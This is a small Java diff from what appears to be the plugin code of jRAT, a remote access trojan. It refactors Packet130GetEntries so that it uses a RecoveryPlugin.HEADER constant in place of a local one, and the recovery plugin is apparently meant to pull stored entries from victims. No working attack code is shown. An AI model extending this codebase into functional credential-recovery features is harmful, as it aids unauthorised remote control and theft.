@@ -7,11 +7,9 @@ import jrat.api.Client;
 import jrat.api.net.PacketBuilder;
 
 public class Packet130GetEntries extends PacketBuilder {
-
-	public static final short HEADER = 130;
 	
 	public Packet130GetEntries(Client rat) {
-		super(HEADER, rat);
+		super(RecoveryPlugin.HEADER, rat);
 	}
 
 	@Override
